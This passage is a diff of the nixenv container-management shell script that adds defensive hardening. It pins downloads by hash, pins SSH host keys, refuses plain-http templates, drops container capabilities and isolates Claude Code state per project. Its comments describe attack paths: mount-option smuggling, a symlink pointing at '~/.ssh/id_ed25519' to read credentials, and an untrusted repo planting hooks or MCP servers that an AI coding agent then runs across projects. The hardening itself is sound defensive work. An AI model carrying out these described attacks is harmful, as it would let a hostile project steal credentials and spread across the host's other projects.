@@ -71,7 +71,21 @@ EGRESS_PORT="${EGRESS_PORT:-3128}"                   # squid egress port INSIDE 
 # --- Templates (init --template=<name|url|path>) ------------------------------
 # A template is ONE file: the project's flake.nix. Short names resolve against
 # this base; full URLs and local paths are used as-is.
-TEMPLATE_BASE="${TEMPLATE_BASE:-https://raw.githubusercontent.com/rande/nixenv/main/templates}"
+# The default is PINNED to what shipped with this script, never `main`:
+#   1. templates/ next to the script (a git clone),
+#   2. ../share/nixenv/templates (Homebrew's pkgshare, installed with the release),
+#   3. else the GitHub tag matching NIXENV_VERSION.
+# Set TEMPLATE_BASE=https://raw.githubusercontent.com/rande/nixenv/main/templates
+# explicitly to follow main.
+if [ -z "${TEMPLATE_BASE:-}" ]; then
+  if [ -f "$SCRIPT_DIR/templates/wordpress.nix" ]; then
+    TEMPLATE_BASE="file://$SCRIPT_DIR/templates"
+  elif [ -d "$SCRIPT_DIR/../share/nixenv/templates" ]; then
+    TEMPLATE_BASE="file://$(cd "$SCRIPT_DIR/../share/nixenv/templates" && pwd)"
+  else
+    TEMPLATE_BASE="https://raw.githubusercontent.com/rande/nixenv/v$NIXENV_VERSION/templates"
+  fi
+fi
 TEMPLATE_CACHE="$HOME/.nixenv/templates"             # fetched templates are cached here
 
 # ── Pretty output ────────────────────────────────────────────────────────────
@@ -122,14 +136,30 @@ materialize_context() {
           # zmx: session persistence (github:neurosnap/zmx). Installed as a
           # PREBUILT static-musl binary — building from source uses zig2nix +
           # bubblewrap, which needs user namespaces the builder container can't
-          # create. fetchTarball has no pinned hash, so the build runs --impure.
-          # Bump zmxVersion to upgrade.
-          zmxVersion = "0.6.0";
+          # create. PINNED by sha256: the build stays pure, and a
+          # changed upstream artifact fails the build instead of landing in
+          # every container. To upgrade, bump zmxVersion AND both hashes — take
+          # them from the release's .sha256 files (zmx.sh/a/<asset>.sha256), which
+          # must equal GitHub's asset digests. See RELEASING.md.
+          zmxVersion = "0.8.1";
+          zmxHashes = {
+            x86_64-linux  = "dfd75720b942466f28870731cc86dbc07afa72fb8f3bd5eeb4ff707e4eecebe8";
+            aarch64-linux = "943eb44c812333fd450da12097521afd3339436e86f8c2ac618b905c4c9ece68";
+          };
           zmxArch = if system == "aarch64-linux" then "aarch64" else "x86_64";
-          zmxSrc = builtins.fetchTarball
-            "https://zmx.sh/a/zmx-${zmxVersion}-linux-${zmxArch}.tar.gz";
+          zmxAsset = "zmx-${zmxVersion}-linux-${zmxArch}.tar.gz";
+          zmxSrc = pkgs.fetchurl {
+            urls = [
+              "https://github.com/neurosnap/zmx/releases/download/v${zmxVersion}/${zmxAsset}"
+              "https://zmx.sh/a/${zmxAsset}"
+            ];
+            sha256 = zmxHashes.${system};
+          };
           zmxPkg = pkgs.runCommand "zmx-${zmxVersion}" { } ''
-            bin=$(find ${zmxSrc} -type f -name zmx | head -n1)
+            mkdir src
+            tar -xzf ${zmxSrc} -C src
+            bin=$(find src -type f -name zmx | head -n1)
+            [ -n "$bin" ] || { echo "zmx binary not found in ${zmxAsset}" >&2; exit 1; }
             install -Dm755 "$bin" $out/bin/zmx
           '';
         in
@@ -491,25 +521,35 @@ SVROOT="$HOME_DIR/.nixenv-sv"      # runit service tree (sshd + project services
 SSHRUN="$HOME_DIR/.nixenv-sshd"    # sshd config + keys
 mkdir -p "$SVROOT/sshd" "$SSHRUN"
 
-# Host keys in the writable HOME.
-for t in ed25519 rsa; do
-  f="$HOME_DIR/.ssh/ssh_host_${t}_key"
-  [ -f "$f" ] || "$SSHKEYGEN" -t "$t" -f "$f" -N "" -q
-done
+# Host key. nixenv generates it on the HOST and mounts it read-only,
+# so the host can pin its fingerprint before the first connection. sshd refuses
+# a private key others can read, and a bind mount keeps the host's mode/owner,
+# so use a private copy. Containers started without the mount (older nixenv)
+# fall back to keys generated in the writable HOME.
+if [ -r /etc/nixenv/ssh_host_ed25519_key ]; then
+  cp /etc/nixenv/ssh_host_ed25519_key "$SSHRUN/ssh_host_ed25519_key"
+  chmod 600 "$SSHRUN/ssh_host_ed25519_key"
+  HOSTKEYS="$SSHRUN/ssh_host_ed25519_key"
+else
+  for t in ed25519 rsa; do
+    f="$HOME_DIR/.ssh/ssh_host_${t}_key"
+    [ -f "$f" ] || "$SSHKEYGEN" -t "$t" -f "$f" -N "" -q
+  done
+  HOSTKEYS="$HOME_DIR/.ssh/ssh_host_ed25519_key $HOME_DIR/.ssh/ssh_host_rsa_key"
+fi
 
 # No authorized_keys is built from the home volume: the container must never be
 # able to authorise a key itself. sshd reads ONLY the host-generated file that
-# cmd_run bind-mounts read-only at /etc/nixenv/authorized_keys (SEC-02).
+# cmd_run bind-mounts read-only at /etc/nixenv/authorized_keys.
 
 SFTP="$(ls "$PROFILE"/libexec/sftp-server 2>/dev/null || ls "$PROFILE"/libexec/openssh/sftp-server 2>/dev/null || true)"
 
 {
   echo "Port $SSHD_PORT"
-  echo "HostKey $HOME_DIR/.ssh/ssh_host_ed25519_key"
-  echo "HostKey $HOME_DIR/.ssh/ssh_host_rsa_key"
+  for k in $HOSTKEYS; do echo "HostKey $k"; done
   echo "PidFile $SSHRUN/sshd.pid"
   echo "PermitRootLogin no"
-  # KEY-ONLY login (SEC-02). This sshd listens on every interface in the
+  # KEY-ONLY login. This sshd listens on every interface in the
   # container, so it is reachable from other projects on nixenv_net and — for
   # restricted projects — through the proxy's relays. The only key it accepts is
   # the per-project one nixenv generated on the HOST, mounted read-only: another
@@ -1039,6 +1079,20 @@ nix_config() {
   fi
 }
 
+# NIX_CONFIG for building a PROJECT's flake — untrusted input:
+#   * no access token: a build script could read it from the environment;
+#   * accept-flake-config = false: a flake's nixConfig could otherwise add its
+#     own substituter AND trusted key, and have attacker-signed binaries land in
+#     the SHARED store that every project uses;
+#   * sandbox = true with fallback: builds are sandboxed wherever the builder can
+#     create namespaces (e.g. BUILDER_PRIVILEGED=1); an unprivileged builder
+#     container usually can't, and Nix then falls back to building unsandboxed.
+#     The trust boundary is documented rather than assumed.
+nix_config_project() {
+  printf 'experimental-features = nix-command flakes\nmax-jobs = auto\n'
+  printf 'accept-flake-config = false\nsandbox = true\nsandbox-fallback = true'
+}
+
 # ── Volume helpers ───────────────────────────────────────────────────────────
 volume_exists()  { "$ENGINE" volume inspect "$NIX_VOLUME" >/dev/null 2>&1; }
 ensure_volume()  {
@@ -1128,6 +1182,23 @@ project_profile() { printf '/nix/var/nix/profiles/proj-%s' "$1"; }   # per-proje
 # container and its entrypoint care about this path — the seed/clone/build/sync
 # helpers just read/write the volume via a throwaway mount, so the repo lands at
 # the volume root regardless and appears at this path when the runtime mounts it.
+# Validate a code-volume mount path: absolute, plain characters (it lands in a
+# `-v vol:<path>` argument, where a ':' would smuggle in mount options), and not
+# colliding with a reserved mount. Shared by `init --app-path` and `import`.
+valid_app_mount() {
+  case "$1" in
+    /*) ;;
+    *) warn "the app path must be absolute (got '$1')"; return 1;;
+  esac
+  case "$1" in
+    *[!a-zA-Z0-9._/-]*|*/../*|*/..|*//*) warn "the app path may only contain letters, digits, '._-/' (got '$1')"; return 1;;
+  esac
+  case "$1" in
+    /|/home|/home/*|/databases|/databases/*|/nix|/nix/*|/etc|/etc/*|/tmp|/tmp/*|/proc|/proc/*|/sys|/sys/*|/dev|/dev/*|/root|/root/*|/usr|/usr/*|/bin|/bin/*|/sbin|/sbin/*|/lib|/lib/*|/lib64|/lib64/*|/run|/run/*)
+      warn "the app path '$1' collides with a reserved or system path — pick another"; return 1;;
+  esac
+  return 0
+}
 project_app_mount() {
   local f; f="$(project_dir "$1")/app_mount"
   if [ -f "$f" ] && [ -s "$f" ]; then cat "$f"; else printf '/app'; fi
@@ -1159,6 +1230,25 @@ project_extra_args() {
   sed 's/#.*//' "$f" | tr '\n\t' '  ' | tr -s ' ' | sed 's/^ *//; s/ *$//'
 }
 
+# Defence-in-depth flags for every container nixenv runs long-lived.
+# The containers already run as your uid with no usable root, so none of this
+# costs a feature:
+#   --cap-drop=ALL                 nothing we run needs a capability (low ports
+#                                  and ping come from the sysctls instead);
+#   no-new-privileges              setuid binaries in debian-slim (mount, passwd,
+#                                  chsh…) can't be used to become root;
+#   --pids-limit                   a fork bomb in one project can't take down the
+#                                  engine VM, and with it every other project.
+# NIXENV_PIDS_LIMIT=0 drops the pids limit (e.g. rootless podman without cgroup
+# delegation, which rejects it). Memory is NOT limited by default — databases and
+# builds vary too much; add --memory via extra-parameters.
+container_hardening_args() {
+  printf '%s\n' --cap-drop=ALL --security-opt=no-new-privileges
+  if [ "${NIXENV_PIDS_LIMIT:-4096}" != 0 ]; then
+    printf '%s\n' "--pids-limit=${NIXENV_PIDS_LIMIT:-4096}"
+  fi
+}
+
 # Created empty (comments only) when missing, so the file is discoverable
 # instead of something you have to know about. Never overwrites an existing one.
 write_extra_parameters() {
@@ -1175,6 +1265,9 @@ write_extra_parameters() {
 #   --security-opt label=disable
 #   --device /dev/fuse
 #   --device /dev/net/tun
+# Note: containers start with --cap-drop=ALL, no-new-privileges and a pids limit.
+# Flags here come later and win — e.g. --cap-add=SYS_ADMIN or
+# --security-opt=no-new-privileges=false — but each one loosens the sandbox.
 EOF
 }
 internal_net()         { printf '%s_%s_egress' "$CONTAINER_PREFIX" "$1"; }
@@ -1211,7 +1304,13 @@ resolve_template() {
   # exists is never mistaken for a name.
   if [ -f "$ref" ]; then printf '%s' "$ref"; return 0; fi
   case "$ref" in
-    http://*|https://*) url="$ref" ;;
+    https://*|file://*) url="$ref" ;;
+    http://*)
+      # A template is code (its flake is built, its hook runs): anyone on the
+      # path could swap it over plain HTTP.
+      if [ "${NIXENV_ALLOW_INSECURE_TEMPLATES:-0}" = 1 ]; then url="$ref"
+      else warn "refusing a template over plain http:// — use https:// (or NIXENV_ALLOW_INSECURE_TEMPLATES=1)"; return 1
+      fi ;;
     *://*) warn "unsupported template URL scheme: $ref"; return 1 ;;
     /*|./*|../*|*/*)                                # looks like a path, but isn't
       warn "no such template file: $ref"; return 1 ;;
@@ -1219,7 +1318,23 @@ resolve_template() {
       warn "no such template file: $ref (short names have no .nix suffix)"; return 1 ;;
     *)
       case "$ref" in *[!a-zA-Z0-9._-]*) warn "invalid template name: $ref"; return 1;; esac
-      url="$TEMPLATE_BASE/${ref}.nix" ;;
+      url="$TEMPLATE_BASE/${ref}.nix"
+      case "$url" in
+        http://*)
+          if [ "${NIXENV_ALLOW_INSECURE_TEMPLATES:-0}" != 1 ]; then
+            warn "TEMPLATE_BASE is plain http:// — refusing (use https://, or NIXENV_ALLOW_INSECURE_TEMPLATES=1)"; return 1
+          fi ;;
+      esac ;;
+  esac
+
+  # file:// (a clone's or Homebrew's own templates): read directly, no curl —
+  # a local path may contain spaces, which curl rejects in a URL.
+  case "$url" in
+    file://*)
+      dest="${url#file://}"
+      [ -f "$dest" ] || { warn "no such template: $dest"; return 1; }
+      log "Using template: $dest" >&2
+      printf '%s' "$dest"; return 0 ;;
   esac
 
   mkdir -p "$TEMPLATE_CACHE"
@@ -1229,6 +1344,11 @@ resolve_template() {
   curl -fsSL --max-time 30 -o "$dest.tmp" "$url" || { warn "could not fetch $url"; return 1; }
   [ -s "$dest.tmp" ] || { warn "template is empty: $url"; rm -f "$dest.tmp"; return 1; }
   mv "$dest.tmp" "$dest"
+  # Show exactly what was fetched, so it can be compared/pinned.
+  local sum=""
+  if have sha256sum; then sum="$(sha256sum "$dest" | cut -d' ' -f1)"
+  elif have shasum; then sum="$(shasum -a 256 "$dest" | cut -d' ' -f1)"; fi
+  [ -z "$sum" ] || log "template sha256: $sum" >&2
   printf '%s' "$dest"
 }
 
@@ -1316,7 +1436,7 @@ ensure_volumes() {
 # Generate the /etc/passwd, /etc/group, /etc/shadow that the container runs with.
 # The container runs as the host uid/gid; these files give that id the name
 # 'app' (home /home/app, shell = shared zsh). Both accounts have NO usable
-# password ('*'): login is by the per-project ssh key only (SEC-02). OpenSSH
+# password ('*'): login is by the per-project ssh key only. OpenSSH
 # treats '*' as "no password", not "locked" (locked is a '!' prefix), so pubkey
 # auth still works. They are bind-mounted read-only into the container.
 write_passwd_files() {
@@ -1344,7 +1464,7 @@ container_running() { "$ENGINE" ps    --format '{{.Names}}' | grep -qx "$1"; }
 # clobbers your edits), so `ssh <project>` connects to the container. Your
 # ~/.ssh/config picks it up via `Include ~/.nixenv/projects/*/ssh/config`
 # (run: nixenv ssh-config --install).
-# Per-project ssh key (SEC-02): the ONLY credential the container's sshd accepts.
+# Per-project ssh key: the ONLY credential the container's sshd accepts.
 # Generated on the HOST and kept in <project>/ssh/, which never travels in an
 # export — so another project, or someone handed an archive, has no copy.
 #
@@ -1352,24 +1472,39 @@ container_running() { "$ENGINE" ps    --format '{{.Names}}' | grep -qx "$1"; }
 # container: the project key, plus any lines YOU put in
 # <project>/ssh/authorized_keys.extra (e.g. your own key for VS Code). Rewritten
 # IN PLACE on every run, so the running container's bind mount sees updates.
+# Generate an ed25519 keypair on the HOST (host ssh-keygen, else the store's).
+gen_ed25519() {
+  local key="$1" comment="$2" dir; dir="$(dirname "$key")"
+  if have ssh-keygen; then
+    ssh-keygen -q -t ed25519 -N '' -C "$comment" -f "$key" </dev/null \
+      || die "could not generate $key"
+  else
+    # No host ssh-keygen: use the store's (openssh is in the base flake).
+    "$ENGINE" run --rm --user "$(id -u):$(id -g)" $(engine_userns) \
+      -v "$NIX_VOLUME":/nix:ro -v "$dir":/out "$(img "$RUNTIME_IMAGE")" \
+      "$PROFILE/bin/ssh-keygen" -q -t ed25519 -N '' -C "$comment" -f "/out/$(basename "$key")" \
+      || die "could not generate $key (and no ssh-keygen on the host)"
+  fi
+  chmod 600 "$key"
+}
+
 ensure_project_ssh_key() {
-  local pdir="$1" sd key name
-  sd="$pdir/ssh"; key="$sd/id_ed25519"; name="$(basename "$pdir")"
+  local pdir="$1" sd key hkey name
+  sd="$pdir/ssh"; key="$sd/id_ed25519"; hkey="$sd/host_ed25519_key"; name="$(basename "$pdir")"
   mkdir -p "$sd"; chmod 700 "$sd"
   if [ ! -f "$key" ]; then
-    if have ssh-keygen; then
-      ssh-keygen -q -t ed25519 -N '' -C "nixenv-$name" -f "$key" \
-        || die "could not generate $key"
-    else
-      # No host ssh-keygen: use the store's (openssh is in the base flake).
-      "$ENGINE" run --rm --user "$(id -u):$(id -g)" $(engine_userns) \
-        -v "$NIX_VOLUME":/nix:ro -v "$sd":/out "$(img "$RUNTIME_IMAGE")" \
-        "$PROFILE/bin/ssh-keygen" -q -t ed25519 -N '' -C "nixenv-$name" -f /out/id_ed25519 \
-        || die "could not generate $key (and no ssh-keygen on the host)"
-    fi
-    chmod 600 "$key"
+    gen_ed25519 "$key" "nixenv-$name"
     ok "generated the project ssh key: $key"
   fi
+  # The container's HOST key is generated here too and mounted
+  # read-only, so its fingerprint is known BEFORE the first connection. `ssh
+  # <project>` then checks it strictly — a process squatting the project's port
+  # after the container stops can't impersonate it.
+  if [ ! -f "$hkey" ]; then
+    gen_ed25519 "$hkey" "nixenv-$name-host"
+  fi
+  printf '%s %s\n' "$(ssh_host_alias "$name")" "$(cut -d' ' -f1,2 "$hkey.pub")" > "$sd/known_hosts"
+  chmod 644 "$sd/known_hosts"
   # (if/fi, not `[ -f ] && …`: inside a { } group a false test would make the
   # whole group fail and skip writing the file.)
   {
@@ -1381,13 +1516,16 @@ ensure_project_ssh_key() {
   chmod 644 "$sd/authorized_keys"
 }
 
+# The name a project's host key is recorded under — independent of the port.
+ssh_host_alias() { printf 'nixenv-%s' "$1"; }
+
 write_host_ssh_config() {
   local name="$1" port pdir sd
   port="$(project_port "$name")"
   pdir="$(project_dir "$name")"; sd="$pdir/ssh"
   mkdir -p "$sd"
   if [ -f "$sd/config" ]; then
-    # Written before key auth (SEC-02): add the IdentityFile lines after 'User',
+    # Written before key auth: add the IdentityFile lines after 'User',
     # leaving any hand edits alone. Without them `ssh <project>` would offer the
     # wrong keys and be refused.
     if ! grep -q 'IdentityFile' "$sd/config"; then
@@ -1397,6 +1535,27 @@ write_host_ssh_config() {
           print "    IdentityFile \"" k "\""; print "    IdentitiesOnly yes"; done=1 }
       ' "$sd/config" > "$sd/config.tmp" && mv "$sd/config.tmp" "$sd/config"
       ok "added the project key to $sd/config"
+    fi
+    # Written before host-key pinning: swap the two generated
+    # "trust anything" lines for the pinned ones; other hand edits are kept.
+    if grep -qE '^[[:space:]]*(StrictHostKeyChecking[[:space:]]+no|UserKnownHostsFile[[:space:]]+/dev/null)' "$sd/config"; then
+      awk -v kh="$sd/known_hosts" -v alias="$(ssh_host_alias "$name")" '
+        /^[[:space:]]*StrictHostKeyChecking[[:space:]]+no[[:space:]]*$/ {
+          print "    StrictHostKeyChecking yes"; print "    HostKeyAlias " alias; next }
+        /^[[:space:]]*UserKnownHostsFile[[:space:]]+\/dev\/null[[:space:]]*$/ {
+          print "    UserKnownHostsFile \"" kh "\""; next }
+        { print }
+      ' "$sd/config" > "$sd/config.tmp" && mv "$sd/config.tmp" "$sd/config"
+      ok "pinned the project host key in $sd/config"
+    fi
+    # The zmx session name must come from %n (the host exactly as typed:
+    # "myapp", "myapp.tests"). %k is the HOST KEY ALIAS when one is set, so
+    # after host-key pinning added HostKeyAlias, every `ssh myapp.<x>` attached
+    # to the same session "nixenv-myapp". Fix configs written with %k.
+    if grep -qE '^[[:space:]]*RemoteCommand[[:space:]].*zmx attach %k[[:space:]]*$' "$sd/config"; then
+      sed 's/\(zmx attach \)%k[[:space:]]*$/\1%n/' "$sd/config" > "$sd/config.tmp" \
+        && mv "$sd/config.tmp" "$sd/config"
+      ok "fixed the zmx session name in $sd/config (%k → %n)"
     fi
     return 0
   fi
@@ -1412,11 +1571,12 @@ Host $name $name.*
     User $APP_USER
     IdentityFile "$sd/id_ed25519"
     IdentitiesOnly yes
-    StrictHostKeyChecking no
-    UserKnownHostsFile /dev/null
+    StrictHostKeyChecking yes
+    HostKeyAlias $(ssh_host_alias "$name")
+    UserKnownHostsFile "$sd/known_hosts"
     LogLevel ERROR
     RequestTTY yes
-    RemoteCommand $PROFILE/bin/zmx attach %k
+    RemoteCommand $PROFILE/bin/zmx attach %n
     ControlMaster auto
     ControlPath ~/.ssh/cm-%r@%h:%p
     ControlPersist 10m
@@ -1424,33 +1584,35 @@ EOF
   ok "wrote host ssh config: $sd/config"
 }
 
-# Prepare the shared Claude state mounted into every container.
-#   ~/.nixenv/claude       → /home/app/.claude       (creds, settings, backups)
-#   ~/.nixenv/claude.json  → /home/app/.claude.json  (global config file)
-# Claude keeps ~/.claude.json in the home root (outside the .claude dir), so we
-# share it as its own file. If it's missing but Claude left a backup in the
-# shared dir, restore the newest one so state carries over.
-prepare_claude_share() {
-  mkdir -p "$CLAUDE_DIR/backups"
-
-  # Is the current global config effectively unconfigured? (missing, empty, {})
-  local need_restore=0 content=""
-  if [ ! -f "$CLAUDE_JSON" ]; then
-    need_restore=1
-  else
-    content="$(tr -d '[:space:]' < "$CLAUDE_JSON" 2>/dev/null || true)"
-    if [ -z "$content" ] || [ "$content" = "{}" ]; then need_restore=1; fi
+# Claude state is PER PROJECT; only the login is shared.
+# Sharing ~/.claude and ~/.claude.json read-write let any project — e.g. an
+# untrusted repo's startup hook — plant an MCP server, a settings.json hook, a
+# CLAUDE.md or a slash command that then ran in EVERY other project. Now:
+#   ~/.nixenv/claude/profiles/<p>/dot-claude  → /home/app/.claude       (settings, hooks, commands…)
+#   ~/.nixenv/claude/profiles/<p>/claude.json → /home/app/.claude.json  (MCP servers, prefs)
+#   ~/.nixenv/claude/.credentials.json        → /home/app/.claude/.credentials.json  (SHARED, rw)
+#   ~/.nixenv/claude/projects/nixenv-<p>      → /home/app/.claude/projects           (transcripts)
+# The credentials file stays shared and writable because token refresh rewrites
+# it — so every project can still READ the token. That limit is documented; the
+# per-project split removes the cross-project persistence, not the token access.
+claude_profile_dir() { printf '%s/profiles/%s' "$CLAUDE_DIR" "$1"; }
+prepare_claude_profile() {
+  local name="$1" prof creds
+  prof="$(claude_profile_dir "$name")"; creds="$CLAUDE_DIR/.credentials.json"
+  mkdir -p "$CLAUDE_DIR" "$prof/dot-claude/projects" "$CLAUDE_DIR/projects/nixenv-$name"
+  chmod 700 "$CLAUDE_DIR" 2>/dev/null || true
+  # Bind-mount targets must pre-exist as FILES, or the engine creates a
+  # directory in their place (root-owned, on Linux).
+  if [ ! -f "$creds" ]; then
+    ( umask 077; printf '{}\n' > "$creds" )
   fi
-
-  if [ "$need_restore" = 1 ]; then
-    local latest
-    latest="$(ls -1t "$CLAUDE_DIR"/backups/.claude.json.backup.* 2>/dev/null | head -1 || true)"
-    if [ -n "$latest" ] && [ -f "$latest" ]; then
-      cp "$latest" "$CLAUDE_JSON"
-      log "restored Claude config from $(basename "$latest")"
-    elif [ ! -f "$CLAUDE_JSON" ]; then
-      printf '{}\n' > "$CLAUDE_JSON"
-    fi
+  chmod 600 "$creds" 2>/dev/null || true
+  [ -e "$prof/dot-claude/.credentials.json" ] || : > "$prof/dot-claude/.credentials.json"
+  # A fresh profile starts clean — deliberately NOT copied from the old shared
+  # ~/.nixenv/claude.json, which any earlier project could have written into.
+  # Only the onboarding flag is set, so `claude` doesn't re-run first-time setup.
+  if [ ! -f "$prof/claude.json" ]; then
+    printf '{\n  "hasCompletedOnboarding": true\n}\n' > "$prof/claude.json"
   fi
 }
 
@@ -1721,14 +1883,7 @@ cmd_init() {
   # Custom code-volume mount path (default /app). Validate it's absolute and not
   # colliding with a reserved mount, then remember it in <project>/app_mount.
   if [ -n "$app_mount" ]; then
-    case "$app_mount" in
-      /*) ;;
-      *) die "--app-path must be an absolute path (got '$app_mount')";;
-    esac
-    case "$app_mount" in
-      /|/home|/home/*|/databases|/databases/*|/nix|/nix/*|/etc|/etc/*|/tmp|/tmp/*|/proc|/proc/*|/sys|/sys/*|/dev|/dev/*|/root|/root/*|/usr/local/bin*)
-        die "--app-path '$app_mount' collides with a reserved mount — pick another";;
-    esac
+    valid_app_mount "$app_mount" || die "invalid --app-path '$app_mount'"
     printf '%s' "$app_mount" > "$pdir/app_mount"
     ok "code volume will mount at '$app_mount' (not /app)"
   fi
@@ -1739,6 +1894,13 @@ cmd_init() {
   # in the allowlist so cloning/pulling works; --unrestricted opts out.
   if [ -n "$git_url" ]; then
     add_allowed_host "$name" "$(forge_host_from_url "$git_url")"
+    # Only the forge may be reached on port 22 (git over ssh). Without
+    # this file every allowed host is reachable on 22 — any sshd on an allowed
+    # name. Add more with one host per line.
+    local _forge; _forge="$(forge_host_from_url "$git_url")"
+    if [ -n "$_forge" ] && [ ! -f "$pdir/ssh_hosts" ]; then
+      printf '%s\n' "$_forge" > "$pdir/ssh_hosts"
+    fi
   fi
   # --allow=… entries, validated the same way as the 'allow' command.
   local _h _nh
@@ -1838,11 +2000,10 @@ cmd_build() {
       rm -f "'"$PROFILE"'" "'"$PROFILE"'"-*-link 2>/dev/null || true
       echo "--- nix profile install into shared profile ---"
       # --profile keeps the GC root + symlinks inside /nix (the volume),
-      # so the runtime container sees them. --impure: zmx uses fetchTarball
-      # (prebuilt binary) with no pinned hash.
+      # so the runtime container sees them. Pure evaluation: every fetch is
+      # hash-pinned (zmx used to need --impure).
       nix profile install "'"$FLAKE_REF"'" \
         --profile "'"$PROFILE"'" \
-        --impure \
         --accept-flake-config \
         --print-build-logs
       echo "--- optimising store (hardlink identical files) ---"
@@ -1926,12 +2087,19 @@ cmd_build_project() {
       || { warn "no flake.nix in the app volume — nothing to build"; warn "(subfolder with local deps? use --dir=<path>)"; return 0; }
     log "Building project flake ('#$PROJECT_ATTR') into $prof"
   fi
+  # Say it once per project — building a flake runs its code as root
+  # with write access to the SHARED store.
+  if [ ! -f "$pdir/.flake-trust-noted" ]; then
+    warn "building '$name''s flake runs its build code with write access to the shared"
+    warn "Nix store used by EVERY project — only build flakes you trust"
+    : > "$pdir/.flake-trust-noted" 2>/dev/null || true
+  fi
   "$ENGINE" rm -f "${CONTAINER_PREFIX}__build-$name" >/dev/null 2>&1 || true
   "$ENGINE" run --rm --name "${CONTAINER_PREFIX}__build-$name" \
     -v "$NIX_VOLUME":/nix \
     -v "$fdir":/flake \
     -w /flake \
-    -e NIX_CONFIG="$(nix_config)" \
+    -e NIX_CONFIG="$(nix_config_project)" \
     "$(img "$BUILDER_IMAGE")" \
     sh -euc '
       mkdir -p /nix/var/nix/profiles
@@ -1940,7 +2108,6 @@ cmd_build_project() {
       echo "--- nix profile install (project extras) ---"
       nix profile install "path:/flake#'"$PROJECT_ATTR"'" \
         --profile "'"$prof"'" \
-        --accept-flake-config \
         --print-build-logs
       nix store optimise || true
       echo "--- project tooling on PATH ---"
@@ -1972,17 +2139,25 @@ cmd_run() {
   appmnt="$(project_app_mount "$name")"
   [ -f "$ENTRYPOINT_FILE" ] || die "missing entrypoint at $ENTRYPOINT_FILE"
   [ "$#" -eq 0 ] || die "run takes no command — use '$0 shell $name' or '$0 ssh $name'"
+  # Defence in depth: these files shape the container's creation, and a
+  # symlink among them could make the engine bind-mount (or read) a host file
+  # outside the project dir — e.g. hosts.extra -> ~/.ssh/id_ed25519.
+  local _mf
+  for _mf in ports hosts.extra extra-parameters app_mount; do
+    if [ -L "$pdir/$_mf" ]; then
+      die "$pdir/$_mf is a symlink — refusing to use it (replace it with a regular file)"
+    fi
+  done
+  valid_app_mount "$appmnt" || die "invalid app path in $pdir/app_mount"
 
   mkdir -p "$pdir/home/.ssh"
   ensure_volumes "$name"        # create + chown (+ seed home) the app/home volumes
-  prepare_claude_share          # shared Claude creds + global config, mounted rw
-  # Per-project Claude transcripts: creds/settings stay SHARED (.claude), but
-  # .claude/projects is overlaid with a per-project dir so session logs are
-  # reviewable per project at ~/.nixenv/claude/projects/nixenv-<name>/ instead
-  # of colliding in one cwd-encoded folder shared by every project.
-  mkdir -p "$CLAUDE_DIR/projects/nixenv-$name"
+  # Per-project Claude state + the one shared login. Transcripts stay
+  # at ~/.nixenv/claude/projects/nixenv-<name>/ as before.
+  prepare_claude_profile "$name"
+  local cprof; cprof="$(claude_profile_dir "$name")"
   write_passwd_files "$pdir"    # /etc/passwd|group|shadow giving our uid the name 'app'
-  ensure_project_ssh_key "$pdir" # the ONLY key sshd accepts (SEC-02); before the config
+  ensure_project_ssh_key "$pdir" # the ONLY key sshd accepts; before the config
   write_host_ssh_config "$name" # <project>/ssh/config for `ssh <project>`
   write_extra_parameters "$name" # <project>/extra-parameters (empty scaffold)
 
@@ -2051,11 +2226,16 @@ cmd_run() {
 
   if container_running "$cname"; then
     ok "Project '$name' already running as '$cname'"
-    # A container created before key auth (SEC-02) still runs the old, open sshd
+    # A container created before key auth still runs the old, open sshd
     # — the fix only applies at creation. Say so, since nothing else would.
     if ! "$ENGINE" inspect -f '{{range .Mounts}}{{.Destination}} {{end}}' "$cname" 2>/dev/null \
          | grep -q '/etc/nixenv/authorized_keys'; then
       warn "'$name' was started before key-only ssh — it still accepts password-less logins"
+      echo "    apply it with: $0 stop $name && $0 run $name"
+    fi
+    if ! "$ENGINE" inspect -f '{{range .Mounts}}{{.Destination}} {{end}}' "$cname" 2>/dev/null \
+         | grep -q '/etc/nixenv/ssh_host_ed25519_key'; then
+      warn "'$name' was started before host-key pinning — 'ssh $name' will report a changed host key"
       echo "    apply it with: $0 stop $name && $0 run $name"
     fi
   else
@@ -2064,6 +2244,9 @@ cmd_run() {
     # Extra engine parameters from <project>/extra-parameters, split into an
     # ARRAY so each flag becomes its own argv entry.
     # (if/fi, NOT `[ ] && cmd`: a false test would return 1 under set -e.)
+    # Hardening, placed BEFORE extra_args so a deliberate override in
+    # extra-parameters (e.g. --cap-add for podman-in-container) still wins.
+    local harden; harden=($(container_hardening_args))
     local _extra extra_args; _extra="$(project_extra_args "$name")"; extra_args=()
     if [ -n "$_extra" ]; then
       extra_args=($_extra)
@@ -2075,6 +2258,7 @@ cmd_run() {
       --network "$netarg" \
       --user "$(id -u):$(id -g)" \
       $(engine_userns) \
+      ${harden[@]+"${harden[@]}"} \
       ${extra_args[@]+"${extra_args[@]}"} \
       --sysctl net.ipv4.ping_group_range="0 2147483647" \
       --sysctl net.ipv4.ip_unprivileged_port_start=0 \
@@ -2089,9 +2273,11 @@ cmd_run() {
       -v "$pdir/group":/etc/group:ro \
       -v "$pdir/shadow":/etc/shadow:ro \
       -v "$pdir/ssh/authorized_keys":/etc/nixenv/authorized_keys:ro \
-      -v "$CLAUDE_DIR":/home/"$APP_USER"/.claude \
+      -v "$pdir/ssh/host_ed25519_key":/etc/nixenv/ssh_host_ed25519_key:ro \
+      -v "$cprof/dot-claude":/home/"$APP_USER"/.claude \
       -v "$CLAUDE_DIR/projects/nixenv-$name":/home/"$APP_USER"/.claude/projects \
-      -v "$CLAUDE_JSON":/home/"$APP_USER"/.claude.json \
+      -v "$CLAUDE_DIR/.credentials.json":/home/"$APP_USER"/.claude/.credentials.json \
+      -v "$cprof/claude.json":/home/"$APP_USER"/.claude.json \
       -v "$ENTRYPOINT_FILE":/usr/local/bin/nixenv-entrypoint:ro \
       -w "$appmnt" \
       -e HOME=/home/"$APP_USER" \
@@ -2306,6 +2492,39 @@ cmd_allow() {
 #          requested, what was allowed (TCP_TUNNEL) vs denied (TCP_DENIED).
 #   usage: egress <project> [-f]
 # =============================================================================
+# Point out allowlist entries that are wider than they look. An allowed
+# host is a place data can be SENT, not just fetched from.
+egress_allowlist_notes() {
+  local pdir f d wild="" forges=""
+  pdir="$(project_dir "$1")"; f="$pdir/allowed_hosts"
+  [ -f "$f" ] || return 0
+  while IFS= read -r d || [ -n "$d" ]; do
+    d="$(printf '%s' "${d%%#*}" | tr -d '[:space:]')"
+    [ -n "$d" ] || continue
+    case "$d" in .*) wild="$wild $d";; esac
+    case "$d" in
